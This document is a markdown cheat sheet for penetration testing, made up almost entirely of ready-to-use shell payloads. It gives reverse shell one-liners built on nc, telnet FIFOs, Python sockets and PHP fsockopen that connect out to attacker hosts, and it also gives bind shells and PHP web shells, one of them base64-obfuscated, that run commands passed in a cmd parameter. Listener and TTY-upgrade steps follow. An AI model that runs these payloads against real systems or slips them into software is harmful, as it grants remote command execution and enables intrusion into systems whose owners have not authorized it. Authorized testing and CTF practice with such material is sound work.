# Shell Cheatsheet

## Reverse Shell

### Shell

```
nc -c '/bin/bash -c "script /dev/null"' 127.0.0.1 1337
```

```
nc -e /bin/sh 10.0.0.1 1234
```

Using FIFO (Doesn't work with upgrading?)

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

Using `telnet` (When no `nc` and no `/dev/tcp` available). Listen with `nc -n -vv -l -p 2222`

```
rm /tmp/yolopipe; mknod /tmp/yolopipe p && telnet 192.168.0.151 2222 0</tmp/yolopipe| /bin/bash 1>/tmp/yolopipe
```

### Python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.170",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Bind Shell

### Bash

port=4444; if [$# -eq 1]; then port=$1; fi; while true; do nc -lp $port -e /bin/bash;wait; done

### Telnet

Lazy Bind Shell using `telnet`:

Listen with `nc -n -vv -l -p 2222` and don't forget the `&` at the end
```
while true; do sleep 5; rm /tmp/yolopipe; mknod /tmp/yolopipe p && telnet 192.168.0.151 2222 0</tmp/yolopipe| /bin/bash 1>/tmp/yolopipe; done &
```


### Python

Connect via `nc`:
```
import socket as a; s = a.socket();s.bind(('0.0.0.0',1337));s.listen(1);(r,z) = s.accept();exec(r.recv(999))
```

After connecting upgrade via:
```
import pty,os;os.dup2(r.fileno(),0);os.dup2(r.fileno(),1);os.dup2(r.fileno(),2);pty.spawn("/bin/sh");s.close()
```

### PHP

Reverse shell using a socket (cmd version)
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Reverse shell using a socket (file version)
```
<?php $sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

## Web Shell

### PHP

Minimal webshell (`?cmd=ls`)

```
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
```

Decodes the Base64 encoded string and evaluates the decoded string "system('ls -la');" as PHP code:
```
<?php
eval(base64_decode("c3lzdGVtKCdscyAtbGEnKTsNCg=="));
?>
```

Base64 encoded cmd webshell
```
<?php eval(base64_decode("aWYoaXNzZXQoJF9SRVFVRVNUWydjbWQnXSkpeyBlY2hvICI8cHJlPiI7ICRjbWQgPSAoJF9SRVFVRVNUWydjbWQnXSk7IHN5c3RlbSgkY21kKTsgZWNobyAiPC9wcmU+IjsgZGllO30=")); ?>
```

Execute system command
```
<?php system(cmd);?>

<?php system("nc -e /bin/sh 10.0.0.1 1234");?>
```

## Listener

### Shell

#### General Listener

Basic Listener, useful with upgrading
```
nc -vvlp 1337
```

```
stty -echo raw; nc -lp 1337; stty sane
```

#### Listen on a specific IP
```
nc -l -p 4444 -s 127.0.0.1
```


## Upgrading


### Shell

- Use bash, not zsh
- In reverse shell: Execute bash (for example using the Python method below)
- In reverse shell: `export TERM=xterm-256color`
- Switch to background with CTRL+Z
- Configure local shell: `stty raw -echo`
- Execute `fg`
- In reverse shell: `reset`

### Python
```
python -c 'import pty; pty.spawn("/bin/sh")'
```

### MSF

```
use post/multi/manage/shell_to_meterpreter
```


## Resources

- [Pentest Monkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [xl7dev](http://blog.safebuff.com/2016/06/19/Reverse-shell-Cheat-Sheet/)
- [Shell upgrading](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
- [Web Shells Introduction](https://www.acunetix.com/blog/articles/keeping-web-shells-undercover-an-introduction-to-web-shells-part-3/)
